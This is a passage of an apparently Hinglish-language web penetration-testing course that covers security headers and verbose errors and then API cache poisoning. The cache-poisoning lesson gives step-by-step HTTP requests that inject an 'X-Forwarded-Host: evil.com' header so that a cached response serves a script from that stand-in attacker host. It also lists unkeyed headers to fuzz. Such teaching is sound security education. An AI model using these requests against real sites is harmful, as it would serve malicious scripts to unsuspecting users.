+- **Security Headers Success:** Headers present hain (secure). Actually hum check kar rahe hain missing ko, toh success for attacker ki headers missing hain. Toh "success" ka matlab vulnerable hai.
+- **Verbose Errors Success:** Detailed error message mila.
+
+#### 9. ⚖️ Comparison (HSTS vs CSP)
+| HSTS | CSP |
+|------|-----|
+| Enforces HTTPS | Controls resource loading |
+| Prevents SSL stripping | Prevents XSS and data injection |
+| One-time header | Detailed policy |
+
+#### 10. 🚫 Common Mistakes
+- **Mistake:** Sirf HSTS check karna. **Fix:** Saare relevant headers check karo.
+- **Mistake:** Verbose errors me sirf SQL errors dhundhna. **Fix:** Path disclosure, version disclosure bhi important hain.
+- **Mistake:** Error messages me sensitive info ko report karna bhoolna.
+
+#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+- **Q:** Kya security headers missing se direct exploit ho sakta hai?
+  **A:** Nahin, lekin ye attack surface badhata hai. Jaise missing CSP se XSS asaan ho jata hai.
+- **Q:** Verbose errors se kya fayda?
+  **A:** Technology stack pata chal jata hai, phir us technology ki known vulnerabilities target kar sakte hain.
+
+#### 12. 🌍 Real-World Use Case
+**GitHub:** Ek bug report mein verbose error se internal path leak ho raha tha. Isse attacker ko source code structure ka pata chal gaya.
+
+#### 13. 🎨 Visual Diagram (ASCII Art)
+```
+Attacker sends malformed request -> Server responds with stack trace -> Attacker learns technology -> Plans further attack.
+```
+
+#### 14. 🛠️ Best Practices (Pro Tips)
+- **Pro Tip 1:** Security headers check karne ke liye online tools hain (securityheaders.com) ya Burp extension "Hackvertor".
+- **Pro Tip 2:** Verbose errors dhundhne ke liye Burp Intruder mein payloads like `'`, `"`, `\x00` etc. bhejo.
+- **Pro Tip 3:** Automation ke liye Nuclei templates use kar sakte ho.
+
+#### 15. ❓ FAQ (Interview Questions)
+- **Q1:** HSTS header ka kya kaam hai?
+  **A:** Browser ko force karta hai ki site sirf HTTPS par access ho, even if user HTTP link click kare.
+- **Q2:** Verbose errors se bachne ke upay?
+  **A:** Production mein debug mode off karo, custom error pages banao.
+- **Q3:** X-Content-Type-Options header kya prevent karta hai?
+  **A:** Browser ko MIME type sniffing se rokta hai, jisse executable content galat tarah se execute nahi hota.
+
+#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+**"Headers missing hain to security dheeli, verbose errors hain to info leak ki meli."**
+
+---
+
+### 🎯 Topic 7.6: API Cache Poisoning
+
+#### 1. 🎯 Title
+**API Cache Poisoning**
+
+#### 2. 🐣 Samjhane ke liye (Analogy)
+Sochiye aapke area mein ek chai wala hai jo chai banata hai aur ek dabbe mein rakh deta hai (cache). Jab bhi koi customer chai maangta hai, woh dabbe se nikaal kar de deta hai. Ab ek banda aata hai aur chai mein thoda namak mila deta hai (malicious payload) aur dabbe mein rakhta hai. Ab agli customer ko namak wali chai milti hai. Yahi cache poisoning hai. API caching mein bhi aisa hota hai—attacker ek specially crafted request karta hai jiska malicious response cache ho jata hai, aur baaki users ko wahi response serve hone lagta hai.
+
+#### 3. 📖 Technical Definition
+API cache poisoning tab hota hai jab attacker cache server (CDN, reverse proxy) ko dhokha dekar ek malicious response store karwa leta hai, jo baad mein legitimate users ko serve hota hai. Yeh typically unkeyed headers ke through hota hai—jaise `X-Forwarded-Host`, `X-Original-URL`—jinhe caching key mein include nahi kiya jaata, lekin server unki value ko response generate karne mein use karta hai. Attacker in headers ko modify karta hai aur cache ko malicious response store karne ke liye force karta hai.
+
+#### 4. 🧠 Zaroorat Kyun Hai?
+Cache poisoning se attacker:
+- Malicious JavaScript inject karwa kar XSS kar sakta hai.
+- Users ko phishing page par redirect kar sakta hai.
+- Sensitive data exfiltrate kar sakta hai.
+- Site ka normal functionality disrupt kar sakta hai.
+
+#### 5. 🔍 Visual - Screen Par Kya Dikhega
+**Victim request:**
+```
+GET /api/translations?lang=en HTTP/1.1
+Host: target.com
+```
+Normal response: `{"welcome":"Welcome"}`
+
+**Attacker request:**
+```
+GET /api/translations?lang=en HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+```
+Agar server `X-Forwarded-Host` ko use karke response mein links generate karta hai (jaise `<script src="http://evil.com/script.js">`), aur cache server is response ko cache kar leta hai, toh baaki users ko bhi malicious script serve hogi.
+
+#### 6. ⚙️ Under the Hood
+- **Caching Key:** CDN (Cloudflare, Akamai) request ke kuch parts ko mila kar cache key banata hai—usually method, host, path, query parameters. Headers like `X-Forwarded-Host` typically key mein include nahi hote.
+- **Unkeyed Headers:** Agar server unkeyed headers ki value ko response mein use karta hai (e.g., dynamic redirect base URL), toh attacker unhe control kar sakta hai.
+- **Process:**
+  1. Attacker request bhejta hai with malicious unkeyed header.
+  2. Server response generate karta hai using that header.
+  3. Cache server response ko store kar leta hai (kyunki cache key (method+path+query) same hai, but header different).
+  4. Ab koi bhi user same URL request karega to cached malicious response milega.
+
+#### 7. 💻 Hands-On Step-by-Step
+**Identify unkeyed headers:**
+- Pehle kisi endpoint ka normal response dekho.
+- Burp mein request bhejo with extra headers like `X-Forwarded-Host: example.com`, `X-Forwarded-Scheme: http`, `X-Original-URL: /admin`, `X-Rewrite-URL: /`.
+- Dekho response mein koi change aaya? Jaise redirect URL badla, ya link generate hua using header value.
+
+**Poisoning attempt:**
+
+**Step 1:** Target endpoint choose karo jo caching use karta ho (e.g., static asset, translations). Identify karne ke liye duplicate request bhej kar response time check karo—pehli request slow, second fast toh cache hai.
+
+**Step 2:** Unkeyed header dhundho jo response ko affect karta ho. Example:
+```
+GET /api/translations?lang=en HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+```
+Response mein kuch aisa dikhe:
+```
+{"welcome":"Welcome","script":"<script src=\"//evil.com/payload.js\">"}
+```
+
+**Step 3:** Ab ye request bhejo multiple times taaki cache ho jaye.
+
+**Step 4:** Verify ki cache hua ya nahi—doosre browser ya incognito mein same URL open karo, aur malicious response dekho.
+
+#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
+- **Success:** Baaki users ko malicious response serve ho raha hai.
+- **Failure:** Cached response normal hai, ya header affect nahi kar raha.
+
+#### 9. ⚖️ Comparison (Cache Poisoning vs Cache Deception)
+| Cache Poisoning | Cache Deception |
+|-----------------|-----------------|
+| Attacker cache mein malicious content store karwaye | Attacker sensitive content cache mein store karwaye (e.g., profile page) |
+| Server ya CDN ko galat response store karne ke liye | URL manipulation se private data cache ho jaye |
+| All users affected | Only if cache stores private data |
+
+#### 10. 🚫 Common Mistakes
+- **Mistake:** Sirf ek header try karna. **Fix:** Multiple unkeyed headers combinations try karo (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-Prefix`, etc.)
+- **Mistake:** Cached response ko verify karne ke liye same browser/session use karna. **Fix:** Different browser ya incognito use karo, ya curl se.
+- **Mistake:** Unkeyed header ki value ko properly encode na karna. **Fix:** Malicious payload encode karo (URL encoding, etc.)
+
+#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
+- **Q:** Cache poisoning ke liye server side caching (Redis, Varnish) aur CDN dono mein same technique?
+  **A:** Ha, concept same hai. CDN mein bhi unkeyed headers ka issue ho sakta hai.
+- **Q:** Kya request me `Host` header bhi unkeyed ho sakta hai?
+  **A:** `Host` almost always keyed hota hai, lekin kabhi kabhi CDN `Host` ko key nahi karta? Usually keyed hota hai.
+- **Q:** Agar server unkeyed header use nahi karta toh kya?
+  **A:** Toh cache poisoning possible nahi.
+
+#### 12. 🌍 Real-World Use Case
+**Cloudflare CDN Cache Poisoning:** 2020 mein ek researcher ne Cloudflare ke edge servers mein cache poisoning vulnerability dhundhi using `X-Forwarded-Host` header. Isse attacker kisi bhi site ke cache mein malicious content store karwa sakta tha.
+
+#### 13. 🎨 Visual Diagram (ASCII Art)
+```
+Attacker -> Request with X-Forwarded-Host: evil.com -> Server generates response using that -> Cache stores malicious response -> User requests same URL -> Gets malicious response from cache.
+```
+
+#### 14. 🛠️ Best Practices (Pro Tips)
+- **Pro Tip 1:** Cache poisoning ke liye "Web Cache Entanglement" technique bhi hoti hai (different URLs same cache key). Iske liye path normalization fuzz karo.
+- **Pro Tip 2:** Unkeyed headers dhundhne ke liye Burp intruder mein common header wordlist lagao.
+- **Pro Tip 3:** Response mein changes detect karne ke liye visual inspection ya diff tools use karo.
+
+#### 15. ❓ FAQ (Interview Questions)
+- **Q1:** Cache poisoning aur cache deception mein antar?
+  **A:** Poisoning me attacker control karta hai content, deception me sensitive data accidentally cache ho jata hai.
+- **Q2:** Cache poisoning se bachne ke upay?
+  **A:** Caching key mein saare relevant headers include karo, aur unkeyed headers ki value ko response mein use mat karo.
+- **Q3:** CDN caching me common unkeyed headers kaun se hain?
+  **A:** `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For` (kabhi kabhi).
+
+#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
+**"Unkeyed header me jahar ghol, cache mein bhar, users ko baant de sabko."**
+
+---
+
+========================================================================================
